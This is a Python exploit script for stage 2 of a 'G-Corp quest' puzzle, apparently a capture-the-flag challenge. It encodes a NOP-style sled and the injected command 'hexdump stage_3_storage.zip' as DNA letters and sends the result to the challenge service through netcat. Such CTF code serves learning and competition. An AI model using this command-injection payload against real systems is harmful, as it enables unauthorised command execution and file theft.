#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#    file: exploit_stage_2
#    date: 2017-09-18
#  author: paul.dautry
# purpose:
#       A working exploit for G-Corp quest challenge stage 2
# license:
#       GPLv3
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#===============================================================================
# IMPORTS
#===============================================================================
import sys
import subprocess
#===============================================================================
# GLOBALS / CONFIG
#===============================================================================
HOST='127.0.0.1'
PORT=12142
#===============================================================================
# CLASSES
#===============================================================================
class Exploit(object):
    #---------------------------------------------------------------------------
    # __init__ 
    #---------------------------------------------------------------------------
    def __init__(self, host=None, port=None):
        super(Exploit, self).__init__()
        self.host = HOST if host is None else host
        self.port = str(PORT) if port is None else port
    #-------------------------------------------------------------------------------
    # __b2d 
    #-------------------------------------------------------------------------------
    def __b2d(self, o):
        dna = b''
        for i in range(0,4):
            v = (o >> ((3-i)*2)) & 3
            if v == 0:
                dna += b'A'
            elif v == 1:
                dna += b'C'
            elif v == 2:
                dna += b'G'
            elif v == 3:
                dna += b'T'
        return dna
    #-------------------------------------------------------------------------------
    # __dna_encode
    #-------------------------------------------------------------------------------
    def __dna_encode(self, data):
        dna = b''
        for o in data:
            dna += self.__b2d(o)
        return dna
    #---------------------------------------------------------------------------
    # run
    #---------------------------------------------------------------------------
    def run(self):
        pld = self.__b2d(0x90) * 128 + self.__dna_encode(b'hexdump stage_3_storage.zip') + self.__b2d(0x00)
        print(pld)
        try:
            out = subprocess.check_output(['nc', self.host, self.port], input=pld)
        except Exception as e:
            print(e)
            return False
        print(out)
        return True
#===============================================================================
# SCRIPT
#===============================================================================
if __name__ == '__main__':
    if len(sys.argv) != 3 and len(sys.argv) != 1:
        print('usage: %s [<host> <port>]' % sys.argv[0])
        exit(1)
    if len(sys.argv) == 3:
        e = Exploit(sys.argv[1], sys.argv[2])
    else:
        e = Exploit()
    exit(0 if e.run() else 1)
